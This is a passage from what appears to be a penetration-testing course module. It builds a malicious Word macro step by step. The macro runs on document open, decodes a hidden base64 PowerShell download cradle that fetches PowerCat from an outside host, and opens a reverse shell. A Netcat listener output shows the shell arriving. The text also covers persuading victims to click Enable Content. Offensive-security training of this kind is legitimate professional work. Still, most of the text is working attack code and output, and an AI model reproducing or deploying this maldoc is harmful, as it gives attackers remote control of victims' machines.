
Microsoft Office applications like Word and Excel allow users to embed _macros_,[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn1) which are a series of commands and instructions grouped together to programmatically accomplish a task. Organizations often use macros to manage dynamic content and link documents with external content.

Macros can be written from scratch in _Visual Basic for Applications_ (VBA),[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn2) which is a powerful scripting language with full access to _ActiveX objects_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn3) and the Windows Script Host, similar to JavaScript in HTML Applications.

In this section, we'll use an embedded macro in Microsoft Word to launch a reverse shell when the document is opened. Macros are one of the oldest and best-known client-side attack vectors. They still work well today, assuming we take the considerations from the previous sections into account and can convince the victim to enable them.

Bear in mind that older client-side attack vectors, including _Dynamic Data Exchange_ (DDE)[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn4) and various _Object Linking and Embedding_ (OLE)[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn5) methods do not work well today without significant target system modification.

Let's dive in and create a macro in Word. We'll create a blank Word document with **mymacro** as the file name and save it in the **.doc** format. This is important because the newer **.docx** file type cannot save macros without attaching a containing template. This means that we can run macros within **.docx** files but we can't embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the **.docm** file type for our embedded macro.

![Figure 19: Saving Document as .doc](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/a4cfc5921b64242ed6a0027a111272c2-csa_macro_save.png)

Figure 19: Saving Document as .doc

After we save the document, we can begin creating our first macro. To get to the macro menu, we'll click on the _View_ tab from the menu bar where we will find and click the _Macros_ element:

![Figure 20: Macro Menu in View Ribbon](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/a53145a35ae8a3b5ec898c0412736712-csa_macro_view2.png)

Figure 20: Macro Menu in View Ribbon

This presents a new window in which we can manage our macros. Let's enter **MyMacro** as the name in the _Macro Name_ section then select the **mymacro** document in the _Macros in_ drop-down menu. This is the document that the macro will be saved to. Finally, we'll click _Create_ to insert a simple macro framework into our document.

![Figure 21: Create a macro for the current document](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/af16daddd29d2bff910e99977a3ddc68-csa_macro_macrocreate2.png)

Figure 21: Create a macro for the current document

This presents the _Microsoft Visual Basic for Applications_ window where we can develop our macro from scratch or use the inserted macro skeleton.

![Figure 22: Macro Editor](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/6bc3f1d4ce2b687eb961c3444f0a380b-csa_macro_vbamenu.png)

Figure 22: Macro Editor

Let's review the provided macro skeleton. The main sub procedure used in our VBA macro begins with the _Sub_[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn6) keyword and ends with _End Sub_. This essentially marks the body of our macro.

A sub procedure is very similar to a function in VBA. The difference lies in the fact that sub procedures cannot be used in expressions because they do not return any values, whereas functions do.

At this point, our new macro, _MyMacro()_, is simply an empty sub procedure containing several lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.

```
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

> Listing 2 - Default empty macro

In this example, we'll leverage _ActiveX Objects_,[7](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn7) which provide access to underlying operating system commands. This can be achieved with _WScript_[8](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn8) through the _Windows Script Host Shell object_.[9](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn9)

Once we instantiate a Windows Script Host Shell object with _CreateObject_,[10](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn10) we can invoke the _Run_[11](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn11) method for _Wscript.Shell_ in order to launch an application on the target client machine. For our first macro, we'll start a PowerShell window. The code for that macro is shown below.

```
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

> Listing 3 - Macro opening powershell.exe

Since Office macros are not executed automatically, we must use the predefined _AutoOpen_ macro and _Document_Open_ event. These procedures can call our custom procedure and run our code when a Word document is opened. They differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.

Our updated VBA code is shown below:

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

> Listing 4 - Macro automatically executing powershell.exe after opening the Document

Next, we'll click on the _Save_ icon in the _Microsoft Visual Basic for Applications_ window and close the document. After we re-open it, we are presented with a security warning indicating that macros have been disabled. To run our macro, we'll click on _Enable Content_.

![Figure 23: Microsoft Word Macro Security Warning](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/4077f3d425ee71440241a15c28038b60-csa_macro_enablecontent.png)

Figure 23: Microsoft Word Macro Security Warning

After we click on _Enable Content_ a PowerShell window appears.

![Figure 24: Enabled Macro started a PowerShell window](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/clientsideattacks/e0226724c6860c7e9f5200aa9a4dcf5c-csa_macro_powershell.png)

Figure 24: Enabled Macro started a PowerShell window

As Figure 24 shows, the PowerShell window was started through our macro. Very nice!

In a real-world assessment, our victim must click on _Enable Content_ to run our macros, otherwise our attack will fail. In enterprise environments, we can also face a situation where macros are disabled for Office documents in general. Fortunately for us, macros are commonly used (and allowed) in most enterprises.

Let's wrap this section up by extending the code execution of our current macro to a reverse shell with the help of _PowerCat_.[12](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn12) We'll use a base64-encoded PowerShell download cradle[13](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn13) to download PowerCat and start the reverse shell. The encoded PowerShell command will be declared as a _String_ in VBA.

We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.

To do this, we'll click on the _Macros_ element in the _View_ tab, select _MyMacro_ in the list and click on _Edit_ to get back to the macro editor. Next, we'll declare a string variable named _Str_ with the _Dim_[14](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/client-side-attacks/exploiting-microsoft-office/leveraging-microsoft-word-macros#fn14) keyword, which we'll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat. The following listing shows the declaration of the variable and the modified line to run the command stored as a string in the variable.

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

> Listing 5 - Declaring a string variable and provide it as a parameter

Next, we'll employ a PowerShell command to download PowerCat and execute the reverse shell. We'll encode the command with base64 to avoid issues with special characters as we've dealt with in previous Modules. The following listing shows the PowerShell command before base64-encoding.

To base64-encode our command, we can use _pwsh_ on Kali as we did in the Common Web Application Attacks Module.

```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 443 -e powershell
```

> Listing 6 - PowerShell download cradle and PowerCat reverse shell

We can use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the _Str_ variable. To do this, we store the PowerShell command in a variable named _str_ and the number of characters for a chunk in _n_. We must make sure that the base64-encoded command does not contain any line breaks after we paste it into the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro.

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

> Listing 7 - Python script to split a base64 encoded PowerShell command string

Having split the base64-encoded string into smaller chunks, we can update our macro:

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

> Listing 8 - Macro invoking PowerShell to create a reverse shell

After we modify our macro, we can save and close the document. Before re-opening it, let's start a Python3 web server in the directory where the PowerCat script is located. We'll also start a Netcat listener on port 4444.

After double-clicking the document, the macro is automatically executed. Note that the macro security warning regarding the _Enable Content_ button is not appearing again. It will only appear again if the name of the document changes.

After the macro is executed, we receive a GET request for the PowerCat script in our Python3 web server and an incoming reverse shell in our Netcat listener.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\offsec\Documents>
```

> Listing 9 - Reverse shell from Word macro

Opening the document ran the macro and sent us a reverse shell. Excellent!

Let's briefly summarize what we did in this section. First, we created a VBA macro in a Word document to execute a single command when the document is opened. Then, we replaced the single command with a base64-encoded PowerShell command downloading PowerCat and starting a reverse shell on the local system.

Microsoft Office documents containing malicious macros are still a great client-side attack vector to obtain an initial foothold in an enterprise network. However, with the growing awareness of users to not open Office documents from emails and the rising number of security technologies in place, it becomes increasingly more difficult to get a macro delivered and executed. Therefore, we'll discuss another client-side attack in the next Learning Unit, which we can use as an alternative or even as a delivery method for malicious Office documents.